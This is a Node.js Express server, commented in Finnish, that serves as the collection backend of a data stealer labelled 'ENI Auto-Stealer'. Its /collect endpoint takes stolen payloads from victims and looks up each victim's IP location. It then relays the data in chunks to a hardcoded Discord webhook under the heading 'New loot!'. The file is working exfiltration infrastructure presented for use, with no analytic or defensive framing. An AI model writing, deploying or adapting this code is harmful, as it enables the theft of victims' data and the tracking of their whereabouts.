const express = require('express');
const app = express();

app.use(express.text({ limit: '50mb', type: '*/*' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

// SUORAAN KOODATTU DISCORD WEBHOOK – EI YMPÄRISTÖMUUTTUJIA
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1523503404016603216/1QAXXBHnwAw-r2HdYgMlrxto-BeGeYRvSsjDmsgz9LO118o6n6qiyYN9DUXO-zhmQ0d3';

async function sendToDiscord(content) {
    try {
        await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(content)
        });
    } catch (e) {
        console.error('Discord error:', e.message);
    }
}

app.post('/collect', async (req, res) => {
    const payload = typeof req.body === 'string' ? req.body : req.body?.payload || '';
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || '?';
    const ts = new Date().toISOString();

    if (!payload || payload.length < 5) {
        return res.status(400).json({ error: 'empty' });
    }

    console.log(`[${ts}] ${ip} — ${payload.length}B`);

    // Geopaikannus
    let geoInfo = 'Ei saatavilla';
    try {
        const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=city,country,isp`);
        const geoData = await geoRes.json();
        geoInfo = `${geoData.city || '?'}, ${geoData.country || '?'} | ${geoData.isp || '?'}`;
    } catch {}

    // 1. Lähetä embed-viesti
    await sendToDiscord({
        embeds: [{
            title: '📥 Uusi saalis!',
            color: 0x9B59B6,
            fields: [
                { name: '🕐 Aika', value: ts, inline: true },
                { name: '🌐 IP', value: ip, inline: true },
                { name: '📍 Sijainti', value: geoInfo, inline: true },
                { name: '📦 Koko', value: payload.length + ' merkkiä', inline: true }
            ],
            footer: { text: 'ENI Auto-Stealer' },
            timestamp: ts
        }]
    });

    // 2. Lähetä data chunkkeina (Discord 2000 merkki raja)
    const chunkSize = 1900;
    const totalChunks = Math.ceil(payload.length / chunkSize);
    
    for (let i = 0; i < payload.length; i += chunkSize) {
        const chunk = payload.substring(i, i + chunkSize);
        const chunkNum = Math.floor(i / chunkSize) + 1;
        
        await sendToDiscord({
            content: `\`\`\`\n[Chunk ${chunkNum}/${totalChunks} | IP: ${ip}]\n${chunk}\n\`\`\``
        });
        
        // Pieni tauko rate limitin välttämiseksi
        await new Promise(r => setTimeout(r, 300));
    }

    res.json({ status: 'ok', size: payload.length, time: ts, chunks: totalChunks });
});

app.get('/', (req, res) => {
    res.send('🟢 ENI Collector Online');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`ENI Collector running on port ${PORT}`);
    console.log('Discord webhook: CONFIGURED');
    console.log('Ready to receive payloads!');
});
